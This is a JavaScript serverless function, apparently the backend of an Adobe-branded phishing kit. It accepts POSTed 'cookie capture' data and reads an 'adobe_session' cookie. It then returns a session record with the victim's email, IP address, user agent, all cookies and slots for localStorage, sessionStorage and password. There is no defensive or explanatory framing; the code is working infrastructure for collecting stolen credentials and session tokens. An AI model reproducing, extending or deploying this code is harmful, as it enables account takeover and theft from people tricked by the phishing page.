export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET' && event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Handle POST requests for cookie capture
    if (event.httpMethod === 'POST') {
      let cookieData = {};
      try {
        cookieData = JSON.parse(event.body || '{}');
      } catch (parseError) {
        console.error('❌ Error parsing POST body:', parseError);
        return {
          statusCode: 400,
          headers,
          body: JSON.stringify({ 
            error: 'Invalid JSON in request body',
            details: parseError.message
          }),
        };
      }
      
      console.log('🍪 Cookie capture received:', cookieData);
      
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ 
          success: true, 
          message: 'Cookie data captured',
          timestamp: new Date().toISOString()
        }),
      };
    }

    // Try to get session from cookie first
    const cookies = event.headers.cookie || '';
    let sessionData = null;

    console.log('🍪 Checking cookies:', cookies);

    if (cookies.includes('adobe_session=')) {
      try {
        const sessionCookie = cookies.split('adobe_session=')[1].split(';')[0];
        const decodedSession = decodeURIComponent(sessionCookie);
        sessionData = JSON.parse(decodedSession);
        console.log('✅ Session found in cookie:', sessionData.email);
      } catch (error) {
        console.error('❌ Error parsing session cookie:', error);
        sessionData = null;
      }
    }

    // Also check for other session indicators
    if (!sessionData && cookies.includes('logged_in=true')) {
      // Try to reconstruct session from other cookies
      const sessionId = cookies.includes('sessionid=') ? 
        cookies.split('sessionid=')[1].split(';')[0] : 
        Math.random().toString(36).substring(2, 15);
      
      const userEmail = cookies.includes('user_email=') ?
        decodeURIComponent(cookies.split('user_email=')[1].split(';')[0]) :
        'unknown@email.com';

      sessionData = {
        email: userEmail,
        provider: 'Unknown',
        fileName: 'Adobe Cloud Access',
        timestamp: new Date().toISOString(),
        sessionId: sessionId,
        clientIP: event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown',
        userAgent: event.headers['user-agent'] || 'Unknown',
        deviceType: event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop',
        cookies: cookies.split(';').map(c => c.trim()),
        formattedCookies: cookies.split(';').map(c => c.trim()),
        localStorage: 'Not available server-side',
        sessionStorage: 'Not available server-side',
        password: 'Not captured server-side'
      };
    }

    if (!sessionData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          success: false, 
          message: 'No active session found',
          cookies: cookies
        }),
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        session: {
          email: sessionData.email,
          provider: sessionData.provider,
          fileName: sessionData.fileName,
          timestamp: sessionData.timestamp,
          sessionId: sessionData.sessionId,
          clientIP: sessionData.clientIP || event.headers['x-forwarded-for'] || 'Unknown',
          userAgent: sessionData.userAgent || event.headers['user-agent'] || 'Unknown',
          deviceType: sessionData.deviceType || (event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop'),
          cookies: sessionData.cookies || cookies.split(';').map(c => c.trim()),
          formattedCookies: sessionData.formattedCookies || cookies.split(';').map(c => c.trim()),
          localStorage: sessionData.localStorage || 'Not available server-side',
          sessionStorage: sessionData.sessionStorage || 'Not available server-side',
          password: sessionData.password || 'Not captured server-side'
        }
      }),
    };

  } catch (error) {
    console.error('❌ Error in getSession function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};